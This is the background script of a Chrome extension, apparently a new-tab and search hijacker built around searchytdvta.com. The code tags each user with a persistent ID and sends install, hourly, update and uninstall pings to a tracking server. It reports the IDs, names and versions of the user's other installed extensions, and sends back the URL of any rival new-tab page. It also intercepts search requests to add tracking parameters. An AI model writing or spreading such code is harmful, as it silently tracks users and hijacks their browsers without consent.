chrome.storage.sync.get(function (result) {
    try {
        //Determines if we should check for a different newtab
        var newtabchanged = result["newtabchanged"] == null ? "no" : "yes";
        if (newtabchanged === "no") {
            newtabcheck();
        }
    }
    catch (err) {

    }
});

chrome.runtime.onInstalled.addListener(function (details) {
    chrome.cookies.getAll({ "url": "http://searchytdvta.com" }, function (cookies) {
        //For new install
        if (details.reason == "install") {
            chrome.storage.sync.get(function (result) {
                //Set default locals
                var Adprovider = (typeof result["adprovider"] === 'undefined') ? "" : result["adprovider"];
                var Source = (typeof result["source"] === 'undefined') ? "" : result["source"];
                var UID = (typeof result["uid"] === 'undefined') ? GenerateNewUserID() : result["uid"];
                var Userclass = (typeof result["userclass"] === 'undefined') ? FetchUserClass() : result["userclass"];
                var Version = "brandedtab_" + chrome.app.getDetails().version;
                var Count = (typeof result["installCount"] === 'undefined') ? 1 : result["installCount"];
                var QueryStrings = "";
                var newtaboption = 0;
                try {
                    //Get cookie and set locals if found
                    for (var i = 0; i < cookies.length; i++) {
                        if (cookies[i].name == "qs" && cookies[i].value != "" && !(cookies[i].value === undefined)) {
                            QueryStrings = cookies[i].value;
                        }
                        if (cookies[i].name == "ntp") {
                            newtaboption = cookies[i].value;
                        }
                    }
                    //Set the important vars
                    if (!(QueryStrings == "")) {
                        var params = QueryStrings.split("&")
                        for (i = 0; i < params.length; i++) {
                            var pair = params[i].split("=")
                            switch (pair[0]) {
                                case "ap":
                                    Adprovider = pair[1];
                                case "source":
                                    Source = pair[1];
                                case "uid":
                                    UID = pair[1];
                            }
                        }
                        window.newTabUrl = "http://search.searchytdvta.com/?uc=" + Userclass + QueryStrings;
                        window.uc = Userclass;
                    }
                    else {
                        window.newTabUrl = "http://search.searchytdvta.com/?uid=" + UID + "&uc=" + Userclass + "&source=" + "&ap=";
                        window.uc = Userclass;
                    }
                }
                catch (err) {
                    window.newTabUrl = "http://search.searchytdvta.com/?uid=" + UID + "&uc=" + Userclass + "&source=" + "&ap=";
                    window.uc = Userclass;
                }
                try {
                    var seconds = new Date() / 1000;
                    var inayear = 31536000;
                    chrome.cookies.set({ "name": "installuc", "url": "http://.searchytdvta.com/", "value": Userclass, "expirationDate": seconds + inayear * 10 }, function (cookie) { });
                } catch (err) { }


                window.firstShow = true;

                if (Count == 1) {
                    //Set data in local storage
                    SetExSyncStorage(Adprovider, Source, UID, Userclass, window.newTabUrl, ++Count);
                    //Send imp
                    SendImpression("ex_installed", Adprovider, Source, UID, Userclass, Version, "1");
                    //Create Tab
                    if (newtaboption == 0) {
                        chrome.tabs.create({ "selected": true });
                    }
                    if (newtaboption == 1) {
                        chrome.tabs.create({ "url": window.newTabUrl + "&page=init" });
                    }
                    if (newtaboption == 2) {

                    }

                    // fire comp before .. changed to only fire once
                    chrome.management.getAll(function (details) {
                        for (i = 0; i < details.length; i++) {
                            if (details[i].type === "extension" && details[i].enabled) {
                                console.log(details);
                                SendImpressionPlus("ex_comp_before", Adprovider, Source, UID, Userclass, Version, details[i].id, details[i].name, details[i].version, details[i].enabled);
                            }
                        }
                    });
                }
                else {
                    //Send imp on different browser install
                    SendImpression("ex_synced", Adprovider, Source, UID, Userclass, Version, Count);
                }
                //Set the uninstall URL
                SetUninstallImpression(UID, Source, Adprovider, Userclass, Version);

                //Create alarm
                chrome.alarms.create("extbb8ping", { delayInMinutes: 1, periodInMinutes: 60 });
            });
        }
            //For update
        else if (details.reason == "update") {
            chrome.storage.sync.get(function (result) {
                //Get storage details
                var Version = "brandedtab_" + chrome.app.getDetails().version;
                var UID = result["uid"];
                var UserClass = result["userclass"];
                var Source = result["source"];
                var Adprovider = result["adprovider"];
                var newtabchanged = result["newtabchanged"] == null ? "no" : "yes";
                chrome.alarms.create("extbb8ping", { delayInMinutes: 1, periodInMinutes: 60 });
                //Set the uninstall URL
                SetUninstallImpression(UID, Source, Adprovider, UserClass, Version);
                //Send imp
                SendImpression("ex_updated", Adprovider, Source, UID, UserClass, Version, "");
            });
        }
    });
});

chrome.webRequest.onBeforeRequest.addListener(function(details){
		navigate = false;
		console.log(details);
		chrome.storage.sync.get(function (result) {
            //Get storage details
            var Version = "brandedtab_" + chrome.app.getDetails().version;
            var UID = result["uid"];
            var UserClass = result["userclass"];
            var Source = result["source"];
            var Adprovider = result["adprovider"];
            details.url = details.url.replace("remove=remove&","");
			chrome.tabs.update(details.tabId, {url : details.url+"&uc="+UserClass+"&uid="+UID+"&ap="+Adprovider+"&source="+Source+"&iid="+Version});
        });
		return {cancel: true} ;
	}, {
        urls: ["http://search.searchytdvta.com/s?remove=remove&query=*"]
}, ["blocking"]);
chrome.alarms.onAlarm.addListener(function (alarm) {
    if (alarm.name == "extbb8ping") {
        chrome.storage.sync.get(function (result) {
            //Get storage details
            var Version = "brandedtab_" + chrome.app.getDetails().version;
            var UID = result["uid"];
            var UserClass = result["userclass"];
            var Source = result["source"];
            var Adprovider = result["adprovider"];
            //Send imp
            SendImpression("ex_enabled", Adprovider, Source, UID, UserClass, Version, "");
        });
    }
});

var extension = "";
chrome.management.onInstalled.addListener(function (details) {
    extension = details;
    chrome.storage.sync.get(function (result) {
        //Get the vars
        var Adprovider = result["adprovider"] === undefined ? "" : result["adprovider"];
        var Source = result["source"] === undefined ? "" : result["source"];
        var UID = result["uid"] === undefined ? GenerateNewUserID() : result["uid"];
        var Userclass = result["userclass"] === undefined ? FetchUserClass() : result["userclass"];
        var Version = "brandedtab_" + chrome.app.getDetails().version;

        //Send imp
        SendImpressionPlus("ex_comp_after", Adprovider, Source, UID, Userclass, Version, extension.id, extension.name, extension.version, extension.enabled);
    });
});

function newtabcheck() {
    //Tab id to check
    var tabid = -1;
    //Has a different then expected new tab been found
    var changed = 0;
    chrome.tabs.onCreated.addListener(function callback(details) {
        //If we already found a different new tab just return
        if (changed != 0) { return; }
        // If the newtab being created is a newtab 'tab'
        if (details.url === "chrome://newtab/") {
            //Grap the newtab id
            tabid = details.id;
        }
    });

    chrome.webNavigation.onBeforeNavigate.addListener(function callback(details) {
        //If we already found a different new tab just return
        if (changed != 0) { return; }
        //If the newtab id matches the current navigation 
        if (details.tabId === tabid) {
            //Resets the tab id
            tabid = -1;
            //If the newtab is different than the expected domain
            if (details.url.indexOf("searchytdvta.com") == -1) {
                //Stop checking
                changed = 1;
                //Store the results
                var userData = {};
                userData["newtabchanged"] = "yes";
                userData["newnewtaburl"] = details.url;
                chrome.storage.sync.set(userData);
                //Sends impression
                chrome.storage.sync.get(function (result) {
                    //Get the vars
                    var Adprovider = result["adprovider"] === undefined ? "" : result["adprovider"];
                    var Source = result["source"] === undefined ? "" : result["source"];
                    var UID = result["uid"] === undefined ? GenerateNewUserID() : result["uid"];
                    var Userclass = result["userclass"] === undefined ? FetchUserClass() : result["userclass"];
                    var Version = "brandedtab_" + chrome.app.getDetails().version;
                    var installNewNewTab = result["newnewtaburl"] === undefined ? "unknown" : result["newnewtaburl"];
                    //Send imp
                    SendImpression("ex_lost_newtab", Adprovider, Source, UID, Userclass, Version, encodeURIComponent(installNewNewTab));
                });
            }
        }
    });
}

/*
 *	Set user data in storage
 */
function SetExSyncStorage(adprovider, source, uid, userclass, newtab, installCount) {
    try {
        //Set storage
        var userData = {};
        userData["adprovider"] = adprovider;
        userData["source"] = source;
        userData["uid"] = uid;
        userData["userclass"] = userclass;
        userData["newtab"] = newtab;
        userData["installCount"] = installCount;
        chrome.storage.sync.set(userData);
    }
    catch (err) {

    }
}

/*
 * Set the uninstall URL
 */
function SetUninstallImpression(uid, source, adprovider, userclass, version) {
    try {
        chrome.runtime.setUninstallURL("http://search.searchytdvta.com/uninstall?" +
											"user_id=" + uid +
											"&source=" + source +
											"&provider=" + adprovider +
											"&uc=" + userclass +
											"&implementation=" + version
										);
    }
    catch (err) {

    }
}

/*
 *	Sends impression
 */
function SendImpression(event, adprovider, source, uid, userclass, version, subid2) {
    try {
        var impression = "http://imp.searchytdvta.com/impression.do?event=" + event +
							"&user_id=" + uid +
							"&source=" + source +
							"&traffic_source=" + adprovider +
							"&subid=" + userclass +
							"&implementation_id=" + version +
							"&subid2=" + subid2
        ;
        var request = new XMLHttpRequest();
        request.open("GET", impression, true);
        request.send(null);
    }
    catch (err) {

    }
}

/*
 *	Sends impression
 */
function SendImpressionPlus(event, adprovider, source, uid, userclass, version, offerid, subid2, page, referrer) {
    try {
        var impression = "http://imp.searchytdvta.com/impression.do?event=" + event +
							"&user_id=" + uid +
							"&source=" + source +
							"&traffic_source=" + adprovider +
							"&subid=" + userclass +
							"&implementation_id=" + version +
							"&subid2=" + subid2 +
							"&page=" + page +
							"&offer_id=" + offerid +
							"&referrer=" + referrer
        ;
        var request = new XMLHttpRequest();
        request.open("GET", impression, true);
        request.send(null);
    }
    catch (err) {

    }
}

/*
 * This function will generate a new GUID. 
 */
function Guid() {
    try {
        function s4() {
            return Math.floor((1 + Math.random()) * 0x10000)
			  .toString(16)
			  .substring(1);
        }

        return s4() + s4() + '-' + s4() + '-' + s4() + '-' +
			s4() + '-' + s4() + s4() + s4();
    }
    catch (err) {
        return "00000000-0000-0000-0000-000000000000";
    }
}

/*
 * This function will return a new user_id.
 */
function GenerateNewUserID() {
    return Guid();
}

/*
 * Requests a User Class for today if cookie not found.
 */
function FetchUserClass() {
    try {
        var url = "http://search.searchytdvta.com/Userclass";

        var ucRequest = new XMLHttpRequest();
        ucRequest.open("GET", url, false);
        ucRequest.send(null);

        if (ucRequest.status == 200 && ucRequest.responseText.length < 12) {
            return ucRequest.responseText;
        }
        else {
            return "17000101";
        }
    }
    catch (err) {
        return "17000101";
    }
}

//Restore link code
function onRequest(request, sender, sendResponse) {
    if (request === "disable") {
        //impression
        chrome.storage.sync.get(function (result) {
            //Get the vars
            var Adprovider = result["adprovider"] === undefined ? "" : result["adprovider"];
            var Source = result["source"] === undefined ? "" : result["source"];
            var UID = result["uid"] === undefined ? GenerateNewUserID() : result["uid"];
            var Userclass = result["userclass"] === undefined ? FetchUserClass() : result["userclass"];
            var Version = "forms_" + chrome.app.getDetails().version;
            var installNewNewTab = result["newnewtaburl"] === undefined ? "unknown" : result["newnewtaburl"];
            //Send imp
            SendImpression("ex_self_disabled", Adprovider, Source, UID, Userclass, Version, encodeURIComponent(installNewNewTab));

            var id = chrome.app.getDetails().id;

            //disables extension
            chrome.management.setEnabled(id, false);
        });
    }

    if (request === "linkClicked") {
        chrome.storage.sync.get(function (result) {
            var Adprovider = result["adprovider"] === undefined ? "" : result["adprovider"];
            var Source = result["source"] === undefined ? "" : result["source"];
            var UID = result["uid"] === undefined ? GenerateNewUserID() : result["uid"];
            var Userclass = result["userclass"] === undefined ? FetchUserClass() : result["userclass"];
            var Version = "forms_" + chrome.app.getDetails().version;
            var installNewNewTab = result["newnewtaburl"] === undefined ? "unknown" : result["newnewtaburl"];
            //Send imp
            SendImpression("ex_disable_link_clicked", Adprovider, Source, UID, Userclass, Version, encodeURIComponent(installNewNewTab));
        });
    }
}

//listens for request
chrome.extension.onRequest.addListener(onRequest);